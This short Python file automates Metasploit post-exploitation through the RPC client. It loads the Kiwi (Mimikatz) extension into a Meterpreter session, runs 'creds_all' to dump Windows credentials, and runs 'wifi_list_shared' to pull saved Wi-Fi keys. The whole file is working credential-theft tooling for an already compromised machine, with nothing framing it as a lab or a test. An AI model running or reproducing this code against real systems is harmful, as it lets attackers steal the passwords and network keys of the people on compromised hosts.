from metasploit.msfrpc import MsfRpcClient
import time

def load_kiwi(shell):
    shell.write('load kiwi\n')
    time.sleep(1)
    ret = shell.read()


def creds_all(shell):
    shell.write('creds_all\n')
    time.sleep(1)
    ret = shell.read()
    try_count = 0
    while not "msv credentials" in ret and try_count < 5:
        time.sleep(1)
        ret = shell.read()
        try_count += 1
    return ret

def get_wifi_list(shell):
    shell.write('wifi_list_shared\n')
    time.sleep(2)
    ret = shell.read()
    return ret
